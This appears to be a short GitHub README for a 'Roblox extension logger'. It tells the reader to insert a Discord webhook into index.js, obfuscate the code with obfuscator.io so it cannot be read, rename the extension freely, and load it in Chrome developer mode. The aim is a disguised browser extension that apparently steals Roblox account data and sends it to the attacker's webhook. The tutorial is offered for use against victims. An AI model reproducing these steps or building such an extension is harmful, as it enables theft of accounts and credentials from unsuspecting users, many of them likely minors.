# ROBLOX-Extension-Logger-Tutorial
Tutorial: Download the files index.js and manifest.json and make a folder after, go into manifest.json and change the name and description to whatever you desire. After that go into index.js and change const webhook = "" to your webhook. Once you do that goto https://obfuscator.io/ (IMPORTANT) and copy whats in index.js after you copy it go back to https://obfuscator.io/ and click Copy and paste Javascript code, put in the script you got from index.js and click obfuscate. After that replace index.js with the obfuscated code you just got and save it. Once all said and done goto chrome://extensions click on developer mode & turn it on after that youll see on the top right "Load pack" click that & select your files. Goto Discord and you have sucessfully created your own extension Logger.
